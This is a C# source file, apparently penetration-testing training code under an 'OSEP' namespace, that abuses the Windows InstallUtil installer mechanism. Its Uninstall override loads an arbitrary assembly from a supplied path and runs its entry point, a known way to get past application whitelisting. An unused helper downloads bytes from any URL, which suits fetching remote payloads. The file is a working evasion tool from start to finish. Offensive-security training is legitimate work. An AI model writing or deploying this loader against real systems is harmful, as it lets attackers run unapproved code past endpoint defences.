using System;
using System.Collections.Generic;
using System.Configuration.Assemblies;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace OSEP
{
    public class Entry
    {
        static void Main(string[] args)
        {
            foreach (string arg in args)
            {
                Console.WriteLine($"ARG: {arg}");
            }
        }
    }



    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string path = Context.Parameters["path"];

            string[] assemblyArgs =
            {
                Context.Parameters["arg1"] ?? string.Empty,
                Context.Parameters["arg2"] ?? string.Empty,
                Context.Parameters["arg3"] ?? string.Empty,
                Context.Parameters["arg4"] ?? string.Empty,
                Context.Parameters["arg5"] ?? string.Empty,
                Context.Parameters["arg6"] ?? string.Empty,
                Context.Parameters["arg7"] ?? string.Empty,
                Context.Parameters["arg8"] ?? string.Empty,
                Context.Parameters["arg9"] ?? string.Empty,
                Context.Parameters["arg10"] ?? string.Empty
            };

            RunAssembly(path, assemblyArgs).GetAwaiter().GetResult();

        }

        private static async Task<int> RunAssembly(string assemblyPath, params string[] args)
        {
            Debug.RunDebug("Loading assembly...");

            Assembly asm;
            asm = Assembly.LoadFrom(assemblyPath);



            MethodInfo entry = asm.EntryPoint;
            ParameterInfo[] entryParams = entry.GetParameters();

            object[] parameters;

            if (entryParams.Length == 0)
            {
                parameters = new object[0];
            }
            else if (entryParams.Length == 1)
            {
                parameters = new object[] { args };
            }
            else
            {
                throw new InvalidOperationException("Unsupported entry point signature.");
            }



            try
            {
                Debug.RunDebug("Invoking assembly...");
                object result = entry.Invoke(null, parameters);

                Task task = result as Task;
                if (task != null)
                {
                    await task;

                    // Handles Task<int>
                    Type taskType = task.GetType();
                    if (taskType.IsGenericType && taskType.GetGenericTypeDefinition() == typeof(Task<>))
                    {
                        PropertyInfo resultProperty = taskType.GetProperty("Result");
                        object taskResult = resultProperty.GetValue(task, null);

                        if (taskResult is int)
                            return (int)taskResult;
                    }

                    return 0;
                }

                if (result is int)
                    return (int)result;
            }
            catch
            {
                Debug.RunDebug("Error invoking assembly...");
            }




            Debug.RunDebug("Done...\n\n");
            return 0;
        }

        public static async Task<byte[]> DownloadFileAsync(string url)
        {
            using (var client = new HttpClient())
            {
                return await client.GetByteArrayAsync(url);
            }
        }


    }
}

